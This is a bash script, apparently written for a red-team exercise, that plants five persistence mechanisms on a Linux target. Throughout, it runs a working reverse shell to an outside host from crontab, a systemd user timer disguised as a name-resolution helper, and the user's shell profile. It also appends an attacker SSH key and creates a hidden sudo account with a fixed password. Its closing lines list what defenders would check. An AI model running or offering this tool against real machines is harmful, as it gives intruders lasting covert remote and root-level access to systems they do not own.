#!/usr/bin/env bash
# plant_linux.sh — plant five different persistence mechanisms on a Linux target.
#
# Usage (on the target, as the user you landed as):
#   bash plant_linux.sh <LHOST> <LPORT> [target_user] [public_key_path]
#
# Example:
#   bash plant_linux.sh 10.42.0.55 4444 lpalmer ~/id_rsa.pub
#
# Notes:
#   - Mechanism 5 (new sudo user) needs root. Everything else works as a normal user.
#   - Every mechanism uses a different trigger, so finding one does not reveal the rest.
#   - Prints a summary table at the end: screenshot it for the report.

set -u

LHOST="${1:-}"
LPORT="${2:-}"
TARGET_USER="${3:-$(id -un)}"
PUBKEY="${4:-}"

if [ -z "$LHOST" ] || [ -z "$LPORT" ]; then
  echo "usage: bash plant_linux.sh <LHOST> <LPORT> [target_user] [pubkey_path]"
  exit 1
fi

HOMEDIR="$(getent passwd "$TARGET_USER" | cut -d: -f6)"
[ -z "$HOMEDIR" ] && HOMEDIR="/home/$TARGET_USER"
CALL='/bin/bash -c "bash -i >& /dev/tcp/'"$LHOST"'/'"$LPORT"' 0>&1"'
SVCNAME="systemd-resolved-helper"
NEWUSER="svc_systemd"
NEWPASS="Summer2026!"
RESULT=()

say()  { printf '[*] %s\n' "$*"; }
ok()   { printf '[+] %s\n' "$*"; RESULT+=("PLANTED  $*"); }
no()   { printf '[-] %s\n' "$*"; RESULT+=("FAILED   $*"); }

say "target user: $TARGET_USER   home: $HOMEDIR   callback: $LHOST:$LPORT"

# ---------------------------------------------------------------- 1. user crontab
if ( crontab -l 2>/dev/null | grep -vF "$SVCNAME-cron" ; \
     echo "*/2 * * * * $CALL >/dev/null 2>&1 # $SVCNAME-cron" ) | crontab - 2>/dev/null; then
  ok "crontab: reverse shell every 2 minutes (crontab -l to see it)"
else
  no "crontab: could not write (no crontab binary?)"
fi

# ------------------------------------------------- 2. systemd user service + timer
USERUNIT="$HOMEDIR/.config/systemd/user"
mkdir -p "$USERUNIT"

cat > "$USERUNIT/$SVCNAME.service" <<EOF
[Unit]
Description=Network Name Resolution Helper

[Service]
Type=oneshot
ExecStart=$CALL
EOF

cat > "$USERUNIT/$SVCNAME.timer" <<EOF
[Unit]
Description=Periodic Network Name Resolution Helper

[Timer]
OnBootSec=2min
OnUnitActiveSec=1min

[Install]
WantedBy=timers.target
EOF

if systemctl --user daemon-reload 2>/dev/null && \
   systemctl --user enable --now "$SVCNAME.timer" 2>/dev/null; then
  ok "systemd: user timer active, fires 1 min after every boot ($USERUNIT/$SVCNAME.timer)"
else
  ok "systemd: unit + timer written to $USERUNIT (not enabled: wrong user context, still on disk)"
  say "  if you are root for another user, try: loginctl enable-linger $TARGET_USER"
fi

# --------------------------------------------------------------- 3. shell profile
PROFILE="$HOMEDIR/.bashrc"
[ -f "$PROFILE" ] || PROFILE="$HOMEDIR/.profile"
if [ -f "$PROFILE" ]; then
  if grep -qF "$SVCNAME-profile" "$PROFILE"; then
    say "profile: marker already present, skipping"
  else
    { echo ""; echo "# $SVCNAME-profile"; echo "( $CALL >/dev/null 2>&1 & )"; } >> "$PROFILE"
    ok "profile: shell on every interactive login (append to $PROFILE)"
  fi
else
  no "profile: no .bashrc or .profile for this user"
fi

# ------------------------------------------------------------ 4. authorized_keys
if [ -n "$PUBKEY" ] && [ -r "$PUBKEY" ]; then
  mkdir -p "$HOMEDIR/.ssh"
  chmod 700 "$HOMEDIR/.ssh" 2>/dev/null
  cat "$PUBKEY" >> "$HOMEDIR/.ssh/authorized_keys"
  chmod 600 "$HOMEDIR/.ssh/authorized_keys" 2>/dev/null
  ok "ssh key: added to $HOMEDIR/.ssh/authorized_keys (password no longer needed)"
else
  say "ssh key: skipped (pass a public key path as the 4th argument to enable)"
fi

# ------------------------------------------------------------- 5. local sudo user
if [ "$(id -u)" -eq 0 ]; then
  if id "$NEWUSER" >/dev/null 2>&1; then
    say "user: $NEWUSER already exists"
  else
    useradd -m -s /bin/bash "$NEWUSER" 2>/dev/null
  fi
  echo "$NEWUSER:$NEWPASS" | chpasswd 2>/dev/null
  if usermod -aG sudo "$NEWUSER" 2>/dev/null || usermod -aG wheel "$NEWUSER" 2>/dev/null; then
    ok "user: $NEWUSER created and added to sudo, password $NEWPASS"
  else
    ok "user: $NEWUSER created, group add failed"
  fi
else
  say "user: skipped (needs root, you are uid $(id -u))"
fi

# ---------------------------------------------------------------------- summary
echo
echo "================ PERSISTENCE SUMMARY (screenshot this) ================"
printf '%s\n' "${RESULT[@]}"
echo "======================================================================="
echo
echo "Test before you claim it:"
echo "  crontab -l"
echo "  systemctl --user list-timers --all | grep $SVCNAME"
echo "  tail -5 $PROFILE"
echo "  getent passwd $NEWUSER ; id $NEWUSER"
echo
echo "What Blue has to look at, per mechanism:"
echo "  crontab     -> crontab -l, auditd key 'cron'"
echo "  systemd     -> systemctl --user list-timers --all, auditd key 'systemd'"
echo "  profile     -> auditd key 'user_profile'"
echo "  ssh key     -> auditd key 'user_ssh' (only if they added that watch)"
echo "  new user    -> /etc/passwd diff, getent group sudo, auditd key 'etcpasswd'"
